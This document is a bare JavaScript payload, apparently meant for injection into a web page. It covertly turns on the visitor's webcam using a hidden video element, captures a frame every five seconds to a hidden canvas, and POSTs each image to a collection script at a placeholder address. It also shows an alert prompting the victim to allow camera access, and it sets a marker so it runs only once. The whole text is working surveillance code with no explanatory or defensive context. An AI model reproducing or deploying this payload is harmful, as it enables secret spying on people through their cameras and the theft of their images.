if (document.getElementById(&#39;webcamsnap&#39;) == null){ 
 
	 var v = document.createElement(&#39;video&#39;);
      v.autoplay=true;
	  v.id=&#39;vid&#39;;
	  v.style.display=&#39;none&#39;;
	  document.body.appendChild(v); 
     if (document.getElementById(&#39;canvas&#39;) == null) {
    var c = document.createElement(&#39;canvas&#39;);
    c.id = &#39;canvas&#39;;
    c.width = &#34;480&#34;;
    c.height = &#34;320&#34;;
    c.style.display = &#34;none&#34;;
    document.body.appendChild(c);
}
var video = document.querySelector(&#34;#vid&#34;);
var canvas = document.querySelector(&#39;#canvas&#39;);
var ctx = canvas.getContext(&#39;2d&#39;);
var localMediaStream = null;
var onCameraFail = function (e) {
    console.log(&#39;Camera is not working.&#39;, e);
};
var xmlhttp=new XMLHttpRequest();

function snapshot() {
    if (localMediaStream) {
        ctx.drawImage(video, 0, 0, 480, 320);
        var dat = canvas.toDataURL(&#39;image/png&#39;);
        xmlhttp.open(&#34;POST&#34;, &#34;http://127.0.0.1/webcam.php&#34;, true);
        xmlhttp.setRequestHeader(&#34;Content-type&#34;, &#34;application/x-www-form-urlencoded&#34;);
    	var x=encodeURIComponent(dat);
        xmlhttp.send(&#34;data=&#34; + x);
       

    }
    else {
        alert(&#34;Allow access to your default web camera.&#34;);
    }
    }

navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
window.URL = window.URL || window.webkitURL;
navigator.getUserMedia({video:true}, function (stream) {
    video.src = window.URL.createObjectURL(stream);
    localMediaStream = stream;
    window.setInterval(&#34;snapshot()&#34;, 5000);
}, onCameraFail);script = document.createElement(&#39;script&#39;);script.id = &#39;webcamsnap&#39;; document.body.appendChild(script); }

